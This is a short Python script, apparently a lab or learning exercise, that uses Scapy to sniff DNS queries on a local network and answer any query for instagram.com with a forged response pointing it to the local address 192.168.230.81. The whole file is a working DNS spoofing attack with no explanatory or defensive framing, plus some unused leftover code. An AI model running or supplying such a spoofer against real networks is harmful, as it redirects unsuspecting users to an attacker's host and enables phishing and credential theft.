from scapy.all import ARP, DNS, sr1, DNSRR, DNS, IP, send, DNSQR, UDP, sniff


def get_mac(ip):
    a = sr1(ARP(pdst=ip))
    return a[ARP].hwsrc


domain = "www.google.com"
new_domain = '192.168.230.81'


def forge_packet(pkt):
    RR_TTL = 60
    forged_DNSRR = DNSRR(rrname=pkt[DNS].qd.qname, ttl=RR_TTL, rdlen=4, rdata=new_domain)
    forged_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=forged_DNSRR)
    return forged_pkt


def hasdns(pkt, targetip):
    send(forge_packet(pkt))
    print("[*] Forged DNS response sent! Told '%s' that '%s' was at '%s'." % (pkt[IP].src, pkt[DNS].qd.qname.decode('UTF-8'), new_domain))
while True:
    a = sniff(count=1,filter='port 53')
    print(a[0][DNSQR].qname)
    if bytes('instagram.com.','utf-8') == a[0][DNSQR].qname:
        print('found.....', a[0][DNSQR].qname)
        hasdns(a[0], '192.168.230.239')

